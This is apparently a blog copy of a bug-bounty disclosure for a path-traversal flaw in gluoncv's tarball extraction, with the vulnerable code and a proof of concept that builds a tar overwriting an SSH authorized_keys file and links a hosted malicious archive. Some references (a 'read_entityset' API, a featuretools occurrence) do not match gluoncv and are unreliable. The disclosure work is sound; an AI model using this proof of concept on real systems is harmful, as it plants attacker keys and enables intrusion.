---
layout: post
title:  "Huntr: Arbitrary File Overwrite in gluoncv"
date:  2024-04-07 10:31:06 +0800
categories: file-overwrite
---

## Name

> Huntr: Arbitrary File Overwrite in url_data in gluoncv

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Description

The [Dataset.from_*](https://cv.gluon.ai/build/examples_auto_module/demo_auto_data.html?highlight=from_folder#image-classification) function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.

The vulnerable function is exposed through the `Dataset.from_*` function, specifically, `ImageClassification.Dataset.from_folders`, `ImageClassification.Dataset.from_csv`, `ImageClassification.Dataset.from_folder` and `ObjectDetection.Dataset.from_voc`, which can be imported easily. There are apis used to load web datasets.

These functions all call `url_data` function to download files from internet, and `url_data` downloads and extract tarball using `untar` function. 

The `url_data` function:

```
def url_data(url, path=None, overwrite=False, overwrite_folder=False, sha1_hash=None, root=None, disp_depth=1):
    fname = Path(path or URLs.path(url, c_key='archive'))
    fname.parent.mkdir(parents=True, exist_ok=True)
    fname = download(url, path=str(fname.resolve()), overwrite=overwrite, sha1_hash=sha1_hash)
    extract_root = URLs.path(url, c_key='data')
    extract_root = extract_root.parent.joinpath(extract_root.stem)
    extract_root.mkdir(parents=True, exist_ok=True)
    if fname.endswith('.zip'):
        folder = unzip(fname, root=root if root else extract_root, strict=overwrite_folder)
    elif fname.endswith('gz'):
        folder = untar(fname, root=root if root else extract_root, strict=overwrite_folder)
    else:
        raise ValueError('Unknown url data with file: {}'.format(fname))
```

The `untar` function:

```
def untar(tar_file_path, root='./', strict=False):
    """Untars files located at `tar_file_path` into parent directory specified by `root`.
    """
    root = os.path.expanduser(root)
    with tarfile.open(tar_file_path, 'r:gz') as zf:
        if strict or not os.path.exists(os.path.join(root, zf.getnames()[-1])):
            zf.extractall(root)
        folder = os.path.commonprefix(zf.getnames())
    return os.path.join(root, folder)
```

The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.

```
Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
```

## Proof of Concept

An attacker can create a malicous tar file using following command:

```
tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
```

Then, the attacker will upload the `hack.tar` to public server. 

I have uploaded one malicous tar file for testing: [https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar](https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar)

If anyone now downloads tar using `read_entityset` api, causing automatically extracting the malicous tar file and overwrite files silently.

```
from gluoncv.auto.tasks import ImageClassification
train, val, test = ImageClassification.Dataset.from_folders(
    'https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar',
    train='train', val='val', test='test', exts=('.jpg', '.jpeg', '.png'))
```

```
$ cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
```

Tested on Google Colab: [https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing](https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing)

![poc](https://live.staticflickr.com/65535/53637853744_26b8a5fff7_h.jpg)


## Impact

This vulnerability can have severe consequences. This section will highlight some tangible impact.

### SSH Access

On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.

### Web Servers

On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)


## Reference

[https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89](https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89)

## Occurrences

[https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170](https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170)
